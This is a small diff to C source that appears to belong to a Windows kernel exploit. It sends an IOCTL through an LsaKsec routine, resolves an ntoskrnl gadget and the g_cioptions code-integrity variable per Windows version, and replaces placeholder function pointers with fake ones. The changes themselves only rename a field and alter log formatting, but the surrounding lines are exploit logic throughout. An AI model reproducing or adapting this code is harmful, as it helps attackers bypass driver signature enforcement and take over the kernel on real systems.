@@ -19,7 +19,7 @@ BOOL WINAPI LsaKsec_SendIoctl()
 	if (pParameterStruct > 0)
 	{
 		pParameterStruct->pInternalStruct = &InternalStruct;
-		pParameterStruct->parameter = (UINT16)0;
+		pParameterStruct->rdx = (UINT16)0;
 
 		while ((((PNTQUERYSYSTEMINFORMATION)0x4141414141414141)(0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL)) != STATUS_SUCCESS)
 		{
@@ -133,8 +133,8 @@ int main()
 	
 	if ((ntoskrnl_gadget > NTOSKRNL_GADGET_OFFSET[windows_version]) && (ci_g_cioptions > CI_G_CI_OPTIONS_OFFSET[windows_version]))
 	{
-		PRINT_SUCCESS(L"ntoskrnl gadget\t: 0x%-016p\n", (PVOID)ntoskrnl_gadget);
-		PRINT_SUCCESS(L"g_cioptions\t: 0x%-016p\n", (PVOID)ci_g_cioptions);
+		PRINT_SUCCESS(L"ntoskrnl gadget\t- 0x%-016p\n", (PVOID)ntoskrnl_gadget);
+		PRINT_SUCCESS(L"g_cioptions\t- 0x%-016p\n", (PVOID)ci_g_cioptions);
 		for (i = 0; i < FakePtrsCount; i++)
 		{
 			if (ReplPointers[i].FakePtr == (PVOID)0x2121212121212121)
